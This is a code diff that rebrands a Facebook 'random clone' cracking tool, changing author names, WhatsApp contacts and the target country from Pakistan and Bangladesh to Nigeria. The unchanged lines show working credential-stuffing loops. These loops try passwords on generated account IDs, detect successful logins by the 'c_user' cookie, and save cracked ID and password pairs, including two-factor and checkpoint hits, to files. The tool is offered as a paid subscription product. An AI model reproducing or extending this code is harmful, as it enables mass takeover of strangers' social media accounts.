@@ -161,7 +161,7 @@ else:
     a = ltx
     tag = "AM"
 logo =f"""{BLUE}==============================
-{BLUE}=  ====  ==      ====        =    \033[1;32m 𓆩𝐇𝐈𝐋𝐀𝐑𝐈𝐎𝐔𝐒𓆪
+{BLUE}=  ====  ==      ====        =    \033[1;32m 𓆩RYDAHXYBER𓆪
 {BLUE}=  ====  ==  ===  ===  =======
 {BLUE}=  ====  ==  ====  ==  =======
 {BLUE}=  ====  ==  ===  ===  =======      \033[1;32m 𓆩𝐁𝐑𝐔𝐓𝐄𓆪
@@ -171,14 +171,14 @@ logo =f"""{BLUE}==============================
 {BLUE}=  ====  ==  ===  ===  =======
 {BLUE}=  ====  ==      ====  =======
 ==============================
-\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐌𝐔𝐇𝐀𝐌𝐌𝐀𝐃 𝐇𝐀𝐌𝐈𝐃 𝐊𝐇𝐀𝐖𝐀𝐉𝐀     \033[1;31m│
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐌𝐔𝐇𝐀𝐌𝐌𝐀𝐃 𝐇𝐀𝐌𝐈𝐃 𝐊𝐇𝐀𝐖𝐀𝐉𝐀\033[1;31m     │
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐇𝐚𝐦𝐢𝐢-𝐤𝐢𝐧𝐠-𝟎𝟔             \033[1;31m │
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+923155912839             \033[1;31m │
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │
-\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m𝐇𝐀𝐌𝐈𝐈 𝐖𝐎𝐑𝐋𝐃             \033[1;31m   │
-\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ HBF }\033[1;37mⒽⒷⒻ╝
+\033[1;37m╔ⒽⒷⒻ═════════════════\033[1;33mRSCT✯𝐓𝐄𝐀𝐌\033[1;37m══════════════ⒽⒷⒻ╗
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mRYDAHXYBER     \033[1;31m│
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mANONYMOUS\033[1;31m     │
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mRYDAH06             \033[1;31m │
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+2349017624430             \033[1;31m │
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.1                     \033[1;31m   │
+\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mRYDAH TECH             \033[1;31m   │
+\033[1;37m╚ⒽⒷⒻRYDAH CYBER SECURITY TEAM{ RSCT }\033[1;37mⒽⒷⒻ╝
 \033[1;91m==========================================================
 \033[31;44m EVERYONE THINKS OF CHANGING THE WORLD     
  BUT NO ONE THINKS OF CHANGING HIMSELF.. 🍂\033[0;m
@@ -191,9 +191,9 @@ def checks(ok,cp):
     if not len(ok) != 0:
         pass
     if len(cp) != 0:
-        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mHBF-OK.txt' % (
+        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mRYDAH-OK.txt' % (
             H, P, str(len(ok))))
-        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mHBF-CP.txt' %
+        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mRYDAH-CP.txt' %
               (H, P, str(len(cp))))
         input("\x1b[1;97mPRESE ENTER TO BACK MENU ")
         xyz()
@@ -210,9 +210,9 @@ def my_tool_security():
     print(logo)
     print(47*"-")
     print(c, 45*"-", wit)
-    print("\t  Facebook : MUHAMMAD HAMID KHAWAJA")
-    print("\t  Fb page  : Hamii Hbf Cammands")
-    print("\t  Github   : Hamii-king-06")
+    print("\t  Facebook : ANONYMOUS")
+    print("\t  Fb page  : RSCT COMMAND")
+    print("\t  Github   : RYDAH06")
     print(c, 45*"-")
     print(47*"-")
     try:
@@ -265,9 +265,9 @@ def my_tool_security():
         print(" This is paid tool you need subscription to use")
         print(" for buy subscription press enter an msg")
         print(" to RSA Programmer fb page and your key")
-        print(" otherwise msg on this whatsapp 03155912839 \n")
+        print(" otherwise msg on this whatsapp 2349017624430 \n")
         print(" Copy your Key :",gre,f_token+_help,wit,"\n")
-        os.system("xdg-open https://www.facebook.com/H4M11.YOUR.DAD")
+        os.system("xdg-open https://www.facebook.com/RYDAH YOUR DAD")
         exit()
 
 
@@ -301,7 +301,7 @@ def cek_apk(session,coki):
 
 #---------------------[MAIN MENU]---------------------#
 def xyz():
-    os.system("play-audio WELCOME_TO_HAMII_RANDOM_CLONE_TOOL.mp3")
+    os.system("play-audio WELCOME.mp3")
     os.getuid
     
     os.system("clear");print(logo)
@@ -310,8 +310,8 @@ def xyz():
     print(f'{BLUE}══════════════════════════════════════════════════════')
     print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
     print(f"{BLUE}══════════════════════════════════════════════════════")
-    print(f"{RED}[01] {WHITE}RANDOM CLONE PAK  M1")
-    print(f"{RED}[02] {WHITE}RANDOM CLONE BD  M1")
+    print(f"{RED}[01] {WHITE}RANDOM SIM NUMBER CLONE NIG  V1")
+    print(f"{RED}[02] {WHITE}RANDOM SIM CLONE NIG  V1")
     print(f"{RED}[03] {WHITE}OWNER FB ID")
     print(f"{RED}[04] {WHITE}OWNER WHATSAPP")
     print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
@@ -325,9 +325,9 @@ def xyz():
         Tabii2()
         
     elif hamii in ["3","03"]:
-        os.system("xdg-open https://www.facebook.com/H4M11.YOUR.DAD");xyz()
+        os.system("xdg-open https://www.facebook.com/RYDAHERROR");xyz()
     elif hamii in ["4","04"]:
-        os.system("xdg-open https://wa.me/+923155912839")
+        os.system("xdg-open https://wa.me/+2349017624430")
         xyz()    
     elif hamii in ["0","00"]:
        exit()
@@ -397,7 +397,7 @@ def password1():
         clear()
         tl = str(len(user))
         print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FASTEST⚡]")
-        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
+        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}NIGERIA NG")
         print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
         print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
@@ -447,32 +447,32 @@ def free1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RYDAH_OK.mp3")
+                print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;34m[HAMII-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_2F.mp3")
+                    print('\r\033[1;34m[RYDAH-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RYDAH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio HAMII_CP.mp3")
-                    print(f'\r\033[1;30m[HAMII-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_CP.mp3")
+                    print(f'\r\033[1;30m[RYDAH-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RYDAH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RYDAH 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -520,7 +520,7 @@ def password2():
         clear()
         tl = str(len(user))
         print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ FAST ]")
-        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
+        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}NIGERIA NG")
         print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
         print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
@@ -570,32 +570,32 @@ def free2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RYDAH_OK.mp3")
+                print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;34m[HAMII-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_2F.mp3")
+                    print('\r\033[1;34m[RYDAH-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RYDAH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio HAMII_CP.mp3")
-                    print(f'\r\033[1;30m[HAMII-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_CP.mp3")
+                    print(f'\r\033[1;30m[RYDAH-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RYDAH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RYDAH 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -637,7 +637,7 @@ def password5():
         clear()
         tl = str(len(user))
         print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl+" ~> [ SLOW 🐌]")
-        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
+        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}NIGERIA NG")
         print(f" {WHITE}NUMBER YOU PUT        : {YELLOW}"+code)
         print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
@@ -687,32 +687,32 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RYDAH_OK.mp3")
+                print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;34m[HAMII-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_2F.mp3")
+                    print('\r\033[1;34m[RYDAH-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RYDAH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio HAMII_CP.mp3")
-                    print(f'\r\033[1;30m[HAMII-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_CP.mp3")
+                    print(f'\r\033[1;30m[RYDAH-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RYDAH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RYDAH 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
@@ -748,7 +748,7 @@ def Tabii2():
         clear()
         tl = str(len(user))
         print(f"\n {WHITE}TOTAL IDZ             : {RED}"+tl)
-        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}BANGLADESH 🇧🇩")
+        print(f" {WHITE}COUNTRY YOU CHOOSE    : {RED}NIGERIA NG")
         print(f" {WHITE}NUMBER YOU PUT        : {RED}"+code)
         print(f" {WHITE}PROCESS HAS BEEN STARTED")
         print(f" {WHITE}BE PATIENT.......")
@@ -800,32 +800,32 @@ def m(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+uid+' [√] '+ps+ '')
+                os.system("play-audio RYDAH_OK.mp3")
+                print('\r\033[1;32m[RYDAH-OK] '+uid+' [√] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/HAMII-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/RYDAH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;34m[HAMII-2F] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/HAMII-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_2F.mp3")
+                    print('\r\033[1;34m[RYDAH-2F] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/RYDAH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    os.system("play-audio HAMII_CP.mp3")
-                    print(f'\r\033[1;30m[HAMII-CP] '+uid+' [×] '+ps+ ' ')
-                    open('/sdcard/HAMII-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    os.system("play-audio RYDAH_CP.mp3")
+                    print(f'\r\033[1;30m[RYDAH-CP] '+uid+' [×] '+ps+ ' ')
+                    open('/sdcard/RYDAH-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[HAMII 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[RYDAH 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
         checks(ok,cp)
     except:
